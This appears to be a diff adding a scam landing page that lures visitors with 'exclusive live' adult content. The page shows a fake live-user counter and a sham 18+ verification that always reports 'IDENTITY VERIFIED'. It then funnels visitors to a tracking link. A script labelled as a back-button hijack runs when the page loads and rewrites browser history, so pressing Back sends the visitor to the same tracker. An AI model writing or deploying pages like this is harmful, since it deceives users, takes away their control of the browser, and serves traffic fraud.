@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Access - Verification</title>
+    <style>
+        :root { --main: #ff2d55; --bg: #0a0a0a; --card: #161616; }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .container { width: 90%; max-width: 400px; background: var(--card); border: 1px solid #222; border-radius: 20px; padding: 35px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
+        
+        /* Premium Badges */
+        .status { font-size: 11px; color: #00ff88; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .dot { width: 6px; height: 6px; background: #00ff88; border-radius: 50%; animation: blink 1s infinite; }
+        
+        h1 { font-size: 1.6rem; font-weight: 800; margin: 0 0 10px; letter-spacing: -0.5px; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+
+        /* The Choice Buttons */
+        .btn { display: block; width: 100%; padding: 18px; border-radius: 12px; border: none; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.3s; margin-bottom: 10px; }
+        .btn-main { background: var(--main); color: #fff; }
+        .btn-main:hover { transform: scale(1.02); box-shadow: 0 10px 20px rgba(255, 45, 85, 0.3); }
+        .btn-outline { background: transparent; border: 1px solid #333; color: #555; }
+
+        /* Real-time Counter */
+        .live-count { font-size: 12px; color: #444; margin-top: 20px; font-weight: 500; }
+
+        /* Access Granted UI */
+        #granted-ui { display: none; }
+        .unlock-btn { display: block; background: #fff; color: #000; padding: 20px; border-radius: 12px; text-decoration: none; font-weight: 900; font-size: 1.3rem; animation: pulse 1.5s infinite; }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="verify-ui">
+        <div class="status"><span class="dot"></span> 1,204 Users Online</div>
+        <h1>PRIVATE ACCESS</h1>
+        <p>You have been invited to view exclusive live content. Please verify your age to continue.</p>
+        
+        <button class="btn btn-main" onclick="startUnlock()">I AM 18+ (ENTER)</button>
+        <button class="btn btn-outline" onclick="location.href='https://google.com'">LEAVE</button>
+        
+        <div class="live-count">Server Location: <span style="color:#777">Los Angeles, CA</span></div>
+    </div>
+
+    <div id="granted-ui">
+        <div class="status" style="color:#00ff88">✓ IDENTITY VERIFIED</div>
+        <h1 style="margin-bottom: 20px;">ACCESS GRANTED</h1>
+        <a href="https://fb07q.bemobtrcks.com/click" class="unlock-btn">WATCH LIVE NOW</a>
+        <p style="margin-top:20px; font-size:12px;">Link valid for next 5 minutes.</p>
+    </div>
+</div>
+
+<script>
+    function startUnlock() {
+        const btn = document.querySelector('.btn-main');
+        btn.innerText = "Verifying...";
+        btn.style.opacity = "0.7";
+        
+        // Fast USA-optimized delay (1.2s)
+        setTimeout(() => {
+            document.getElementById('verify-ui').style.display = 'none';
+            document.getElementById('granted-ui').style.display = 'block';
+        }, 1200);
+    }
+
+    // USA BACK-BUTTON HIJACK (Redirects to Smart Link)
+    (function(window, location) {
+        history.replaceState(null, document.title, location.pathname + "#!/access");
+        history.pushState(null, document.title, location.pathname);
+        window.addEventListener("popstate", function() {
+            if (location.hash === "#!/access") {
+                history.replaceState(null, document.title, location.pathname);
+                setTimeout(function() {
+                    location.replace("https://fb07q.bemobtrcks.com/click");
+                }, 0);
+            }
+        }, false);
+    }(window, location));
+</script>
+
+</body>
+</html>
